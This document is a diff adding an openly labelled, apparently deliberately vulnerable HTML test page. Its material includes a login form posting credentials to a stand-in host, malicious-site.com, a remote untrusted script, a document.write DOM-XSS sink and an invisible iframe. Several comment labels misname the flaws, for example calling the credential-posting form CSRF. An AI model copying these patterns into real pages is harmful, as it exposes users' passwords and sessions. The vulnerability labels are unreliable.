@@ -1,0 +1,39 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Vulnerable HTML</title>
+</head>
+<body>
+    <h1>Welcome to a Vulnerable HTML Page</h1>
+
+    <!-- Inline JavaScript (XSS vulnerability) -->
+    <script>
+        alert('This is an XSS vulnerability!');
+    </script>
+
+    <!-- Unsafe form action (potential CSRF vulnerability) -->
+    <form action="http://malicious-site.com/steal-data" method="POST">
+        <input type="text" name="username" placeholder="Enter your username">
+        <input type="password" name="password" placeholder="Enter your password">
+        <button type="submit">Submit</button>
+    </form>
+
+    <!-- External script from an untrusted source -->
+    <script src="http://untrusted-source.com/malicious-script.js"></script>
+
+    <!-- Inline styles (potential CSS injection) -->
+    <style>
+        body {
+            background-color: red;
+        }
+    </style>
+
+    <!-- Unvalidated user input (reflected XSS vulnerability) -->
+    <p>Your input: <script>document.write(window.location.hash.slice(1));</script></p>
+
+    <!-- Clickjacking vulnerability -->
+    <iframe src="http://malicious-site.com/clickjacking" style="opacity: 0;"></iframe>
+</body>
+</html>
